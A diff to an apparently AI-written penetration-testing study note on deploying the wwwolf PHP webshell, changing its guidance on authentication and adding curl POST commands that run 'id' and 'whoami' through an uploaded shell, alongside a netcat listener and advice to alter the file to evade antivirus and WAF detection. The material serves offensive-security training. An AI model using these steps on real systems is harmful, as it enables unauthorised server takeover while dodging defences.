@@ -12,7 +12,7 @@ wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/maste
 ```
 
 > [!note]
-> No IP restriction by default — anyone who finds the URL can use it. Add an IP check if operating on a shared network. The shell is a known signature; rename the file and/or modify it slightly to avoid AV/WAF detection.
+> **No auth by default** — `$passhash` is empty, so anyone who finds the URL can use it. To lock it down, generate a hash with the repo's `passhash.sh` and set `$passhash`/`$passprompt` at the top of the file. The shell is a known signature; rename the file and/or modify it slightly to avoid AV/WAF detection.
 
 ---
 
@@ -61,10 +61,11 @@ Browse to the uploaded file — the shell provides:
 - **File viewer** — read files
 - **Upload** — push additional files to the server
 
-Quick commands via URL parameter (useful for automation):
-```
-http://target/uploads/shell.php?cmd=id
-http://target/uploads/shell.php?cmd=whoami
+Commands are read from **`$_POST['cmd']` only** — there is no `?cmd=` GET support (a common misconception). For scripted/automation use, POST the field:
+```bash
+curl -s http://target/uploads/shell.php -d 'cmd=id'
+curl -s http://target/uploads/shell.php -d 'cmd=whoami'
+# If a password is set, add: -d 'pass=YOURPASS'
 ```
 
 > [!tip]
@@ -102,6 +103,10 @@ nc -lvnp 443
 
 ---
 
+> [!note] **See also** — Multi-language webshell collection (ASPX/PHP/JSP/CFM): [[Tools/Payloads & Shells/Laudanum|Laudanum]]. PowerShell/ASPX interactive console: [[Tools/Payloads & Shells/Antak|Antak]]. Getting the file past upload filters: [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]]; staging/transfer: [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]].
+
+---
+
 *Created: 2026-03-13*
-*Updated: 2026-03-13*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-31*
+*Model: claude-opus-5*
